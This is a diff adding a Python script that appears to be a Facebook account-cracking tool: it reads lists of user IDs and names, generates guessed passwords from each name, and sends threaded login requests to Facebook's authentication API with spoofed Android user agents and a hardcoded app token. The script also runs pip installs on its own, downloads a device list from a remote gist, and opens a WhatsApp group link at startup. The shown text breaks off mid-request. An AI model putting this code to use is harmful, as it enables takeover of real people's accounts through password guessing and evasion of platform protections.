@@ -1,0 +1,565 @@
+#<<_________[ COLOR ]_________>>#
+W = '\033[97;1m' 
+B = '\033[96;1m'
+P = '\033[95;1m' 
+R = '\033[91;1m' 
+G = '\033[92;1m'
+#os.system("pip uninstall urllib3 requests chardet idna certifi -y;pip install urllib3 requests chardet idna certifi")
+import os,time
+os.system('clear')
+os.system('xdg-open https://chat.whatsapp.com/JScWDtUW0ll2XS00poV7GT')
+try:
+    import requests
+    import marshal
+    from string import *
+    from bs4 import BeautifulSoup
+    from bs4 import BeautifulSoup as sop
+    from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError: 
+    os.system('pip install requests > /dev/null')
+except:pass
+import json,time,re,random,sys,uuid,string,subprocess,zlib,platform,base64
+try:import arrow
+except:os.system('pip install arrow');import arrow
+try:import httplib2
+except ModuleNotFoundError:
+    try:
+        with open(os.devnull, 'w') as null:
+            subprocess.check_call(["pip", "install", " httplib2"], stdout=null, stderr=null)
+            import httplib2
+    except subprocess.CalledProcessError:
+        print(f" Module Installing Failed")
+        exit()
+
+#─━─━─━─━[User Agent]━─━─━─━─━#
+def EROORfile():
+    END = 'Dalvik/2.1.0 (Linux; U; Android 13; LG-H735 Build/PPR1.182786.470) [FBAN/PAAA;FBAV/369.0.0.17.112;FBDM/{density=2.75,width=1080,height=2232};FBLC/en_GB;FBBV/386998368;FB_FW/2;FBSN/Android;FBDI/e5957a8c-deca-4bd4-8920-65893d290275;FBCR/NTT DOCOMO;FBMF/SHARP;FBBD/DOCOMO;FBDV/SH-54B;FBSV/12;FBCA/arm64-v8a:null;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; LG-H735 Build/PPR1.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+def EROORfile1():
+    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
+    ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 12; Armor X10 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; LT600T Build/QKQ1.200216.002)","Dalvik/2.1.0 (Linux; U; Android 13; SHG07 Build/S116H)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/T3B2.230316.003)","Dalvik/2.1.0 (Linux; U; Android 5.1; Ixion ES350 Build/DEXP)","Dalvik/2.1.0 (Linux; U; Android 12; ELZ-AN20 Build/HONORELZ-AN20)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RA33.55-15-10)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z012DA Build/MMB29P)","Dalvik/2.1.0 (Linux; U; Android 11; BQru-6868L Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 22031116AI Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; O2 TV Box Build/QTT2.200720.001)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision Build/PSA29.97-37)","Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6P Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2127 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 12; 100071485 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505N Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 10.0; YT7260L Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Gtel X7plus Build/O11019)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; TPS550A Build/KTU84Q)","Dalvik/2.1.0 (Linux; U; Android 10; TC57 Build/10-16-10.00-QG-U133-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris60c Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)","Dalvik/2.1.0 (Linux; U; Android 7.0; SPYBOXSXMINI Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; K55g Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; V2065 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 11; E506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; BNE-LX3 Build/HUAWEIBNE-LX3)","Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)","Dalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)","Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)","Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)","Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 10; Note 7T Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 13; SM-G9880 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; T10W2 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; CORN X55 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; PO-10034 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 11; 2209116AG Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; DroidBox Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; moto e(6) plus Build/PTAS29.401-25-3)","Dalvik/2.1.0 (Linux; U; Android 11; Motorola Defy Build/RZD31.31)","Dalvik/2.1.0 (Linux; U; Android 10; HEYOU20 Build/QKQ1.191008.001)","Dalvik/2.1.0 (Linux; U; Android 11; U55 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; px30_evb Build/OPM8.190505.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3-1)","Dalvik/2.1.0 (Linux; U; Android 12; moto g72 Build/S3SVS32.45-28-2-2)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-1)","Dalvik/2.1.0 (Linux; U; Android 12; A003SH Build/S2010)","Dalvik/2.1.0 (Linux; U; Android 9; VOG-L04 Build/HUAWEIVOG-L04)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G ace Build/QZKS30.Q4-40-64-14)","Dalvik/2.1.0 (Linux; U; Android 11; JAD-LX9 Build/HUAWEIJAD-L09)","Dalvik/2.1.0 (Linux; U; Android 12; V2202 Build/SP1A.210812.003_SC)","Dalvik/2.1.0 (Linux; U; Android 10.1; T99 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 11; Grundig Android UHD TV Build/RTM3.211215.227)","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Build/RQ2A.210505.003)","Dalvik/2.1.0 (Linux; U; Android 11; Black G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; K6b Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 6.0; 4049G Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.1; GOLDTVPlus Build/NRD91N)","Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L33)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; G706 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1; TIS001 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 11; C60 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10.0; B9212BF Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 6.0; W NEXT Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 9; Bmobile AX754 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; TIS_001 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; WS5SE Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L03)","Dalvik/2.1.0 (Linux; U; Android 12; T776O Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SGINO6 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; KB2007 Build/RKQ1.211119.001)","Dalvik/2.1.0 (Linux; U; Android 11; ABR-LX9 Build/HUAWEIABR-L09)","Dalvik/2.1.0 (Linux; U; Android 11; NCO-LX3 Build/HUAWEINCO-LX3)","Dalvik/2.1.0 (Linux; U; Android 12; moto g51 5G Build/S2RYAS32.58-13-12-4)","Dalvik/2.1.0 (Linux; U; Android 13; SH-RM19s Build/S3067)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A047M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; Black_Z Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; 22120RN86G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; S10 Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 11; DS502 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2365 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A135N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; I2207 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 5.0; W55SE Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 11; K58 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-9-7)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; GOA Build/KOT49H)",]) +END
+    return ua
+def EROOR_ua():
+    gtt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
+    END = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-J701F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/433.0.0.32.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/532438874;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/SM-J701F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;] FBBK/1'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-J701F Build/PPR1.190305.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
+#─━─━─━─━[METHOD 1]━─━─━─━─━#
+def ua1():
+        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/81.0.0.22.70;[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022707;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]' 
+        return ua
+model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()   
+#─━─━─━─━[METHOD 2]━─━─━─━─━#
+def ua2():
+    END = '[FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]'+'[FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/ 180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/ {density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;] FBBK/1'+'[FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+#─━─━─━─━[METHOD 3]━─━─━─━─━#
+def ua3():
+    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
+    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
+    b = ";[FBAN/Orca-Android;FBAV/436.0.0.45.111;FBPN/com.facebook.orca;FBLC/fr_GN;FBBV/541554436;FBCR/Orange GN;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2207};FB_FW/1;]"
+    c = ";[FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/548243065;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A525F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]"
+    d = ";FBAN[FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;]"
+    e = ";FBAN[FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_US;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2199};FB_FW/1;]"
+    f = ";[FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/No service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;]"
+    g = ";[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]"
+    l = ";[FBAN/Orca-Android;FBAV/426.0.0.27.102;FBPN/com.facebook.orca;FBLC/in_ID;FBBV/515381945;FBCR/Telkomsel;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/RNE-L22;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2050};FB_FW/1;]"
+    ua = a+b+c+d+e+f+g+l
+    return ua
+#####_____Folder-Setup_____#####
+try:
+    os.makedirs('/sdcard/MOHMMED')
+except:
+    pass
+sys.stdout.write('\x1b]2;🄼🄾🄷🄰🄼🄴🄳\x07')
+#<<_________[ LOGO ]_________>>#
+logo =f"""\33[1;37m                                            
+\33[1;31m:::::::::::::::::::::::::::::::::::::::::::::
+\33[1;31m:: \33[1;32m    dMMMMMMMMb  dMMMMMP dMP     .aMMMb\33[1;31m  :: 
+\33[1;31m:: \33[1;32m   dMP"dMP"dMP dMP     dMP     dMP"dMP\33[1;31m  :: 
+\33[1;31m:: \33[1;32m  dMP dMP dMP dMMMP   dMP     dMMMMMP\33[1;31m   ::   
+\33[1;31m:: \33[1;32m dMP dMP dMP dMP     dMP     dMP dMP\33[1;31m    ::   
+\33[1;31m:: \33[1;32mdMP dMP dMP dMMMMMP dMMMMMP dMP dMP\33[1;31m     :: 
+:: \33[1;33mＭＯＨＡＭＥＤ     ＥＬ    ＡＭＩＮＥ   \33[1;31m:: 
+\33[1;31m::::::::::::::::::::::::::::::::::\33[1;36m|V=\33[1;36m1.2\33[1;36m|\33[1;31m:::: 
+\33[1;36m══════════════════════════════════════════════
+\33[1;31m[\33[1;36m◽\33[1;31m]\33[1;32m DEVLOPER\33[1;36m ◽\33[1;32m MOHAMMED EL AMINE
+\33[1;31m[\33[1;36m◽\33[1;31m]\33[1;32m FACEBOOK \33[1;36m◽\33[1;32m MOHAMMED EL AMINE
+\33[1;31m[\33[1;36m◽\33[1;31m]\33[1;32m TIPE   \33[1;36m  ◽\33[1;32m FREE{W} ╋ \33[1;32mFILE
+\33[1;31m[\33[1;36m◽\33[1;31m]\33[1;32m GITHUB\33[1;36m   ◽\33[1;32m MOHAMMED-143
+\33[1;36m══════════════════════════════════════════════"""
+loop=0
+oks=[]
+cps=[]
+cp=[]
+pcp=[]
+def line():
+    print(f"\33[1;36m══════════════════════════════════════════════")
+def clear():
+    os.system(f'clear')
+    print(logo)
+#<<_________[ Main Menu ]_________>>#
+def menu1():
+    clear()        
+    print(f"{R}[{G}1{R}] {G}File Cloning ")
+    print(f"{R}[{G}2{R}] {G}File Crate")
+    print(f"{R}[{G}3{R}] {G}Admin Contect") 
+    print(f"{R}[{G}0{R}] {G}Exit")
+    line()    
+    xd=input(f'{R}[◽{R}]{W} CHOSE: ')
+    if xd in ['1','01']:
+        clear()
+        print(f'{R}[◽{R}]{W} EXP:  {G}/sdcard/File.txt  etc..')
+        line()
+        file = input(f'{R}[◽{R}] {G}PUT FILE\033[1;37m: ')
+        try:
+            fo = open(file,'r').read().splitlines()
+        except FileNotFoundError:
+            print(f'{R}[◽{R}]{W} FILE NOT FOUND ')
+            time.sleep(1)
+            exit()
+        clear()
+        
+        print(f'{R}[{G}1{R}] {G}METHOD 1  {R}[{G} NEW {R}]')
+        print(f'{R}[{G}2{R}] {G}METHOD 2  {R}[{G} OLD {R}]')
+        print(f'{R}[{G}3{R}] {G}METHOD 3  {R}[{G} MIX {R}]')
+        print(f'{R}[{G}3{R}] {G}METHOD 4  {R}[{G} MIX {R}]')
+        line()
+        mthd=input(f'{R}[◽{R}]{W} CHOSE: ')
+        
+        plist = []
+        clear()
+        print(f'{R}[{G}1{R}] {G}CRACK WITH AUTO PASS')
+        print(f'{R}[{G}2{R}] {G}CRACK WITH MANUAL PASS')
+        line()
+        ppp=input(f'{R}[◽{R}]{W} CHOSE: ')
+        clear()
+        if ppp in ['1','01']:
+                plist.append('first last')
+                plist.append('first first')
+                plist.append('firstfirst')
+                plist.append('firstlast')
+                plist.append('last first')
+                plist.append('lasr last')
+                plist.append('lastlast')
+                plist.append('lastfirst')               
+                plist.append('first123')                             
+                                
+                
+             
+        else:
+                try:
+                    ps_limit = int(input(f'{R}[{R}◽{R}]{G} PASS LIMIT : '))
+                except:
+                    ps_limit = 2
+                clear()
+                print(f'{R}[{R}◽{R}] EXP: {G}first last,firtslast,first123')
+                line()
+                for i in range(ps_limit):
+                        plist.append(input(f'{R}[{R}◽{R}]{W} PUT PASS {i+1}: '))
+        
+        with tred(max_workers=30) as crack_submit:
+            clear()
+            total_ids = str(len(fo))
+            print(f'{R}[◽{R}]{G} TOTAL IDS :{R} '+total_ids+f'{W} ╋ {G}METHOD :{R} '+mthd+f' ')               
+            print(f'{R}[◽{R}]{G} TRUN {G}[{G}ON{G}/{R}OFF{G}] {G}MODE AVION AVRY 3 MINIT ')
+            line()
+            for user in fo:
+                ids,names = user.split('|')
+                passlist = plist
+                if mthd in ['1','01']:
+                    crack_submit.submit(ffb1,ids,names,passlist)
+                elif mthd in ['2','02']:
+                    crack_submit.submit(ffb2,ids,names,passlist)
+                elif mthd in ['3','03']:
+                    crack_submit.submit(ffb3,ids,names,passlist)
+                elif mthd in ['4','04']:
+                    crack_submit.submit(ffb4,ids,names,passlist)
+        print(f'\033[1;37m')
+        line()
+        print(f'{R}[◽{R}]{W} PROCESS COMPLTED')
+        print(f"{R}[◽{R}]{W} {W} OK IDZ : {G}%s "%(len(oks)))
+        print(f"{R}[◽{R}]{W} {W} CP IDZ : {R}%s "%(len(cps)))
+        line()
+        input(f'{R}[◽{R}]{W} PRESS ENTER TO BACK ')
+        exit()
+    elif xd in ['2','02']:
+        Create_exit()
+    elif xd in ['3','03']:
+        ipMain()
+    elif xd in ['0','00']:
+        exit(f'{R}[◽{R}]{W} Thanks For Use ')
+    else:
+        exit(f'{R}[◽{R}]{W} Option not found in menu...')
+
+def ffb1(ids,names,passlist):
+    try:
+        global oks,cps,loop
+        sys.stdout.write(f'\r\r{R}[{G}MOHMMED{R}]{W}-{R}[{B}%s{R}]{W}-{R}[{G}OK:%s{R}]{W}-{R}[\33[1;32mCP:%s{R}] {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
+            data = {"adid": str(uuid.uuid4()),
+'format':'json',
+'device_id':str(uuid.uuid4()),
+'email':ids,
+'password':pas,
+'generate_analytics_claims':'1',
+'community_id':'',
+'cpl':'true',
+'try_num':'1',
+'family_device_id':str(uuid.uuid4()),
+'credentials_type':'password',
+'source':'login',
+'error_detail_type':'button_with_disabled',
+'enroll_misauth':'false',
+'generate_session_cookies':'1',
+'generate_machine_id':'1',
+'currently_logged_in_userid':'0',
+'locale': 'en_US',
+'client_country_code': 'US',
+'fb_api_req_friendly_name':'authenticate',
+'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
+'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+            headers={'User-Agent':EROORfile(),
+'Accept-Encoding': 'gzip, deflate',
+'Connection': 'Keep-Alive',
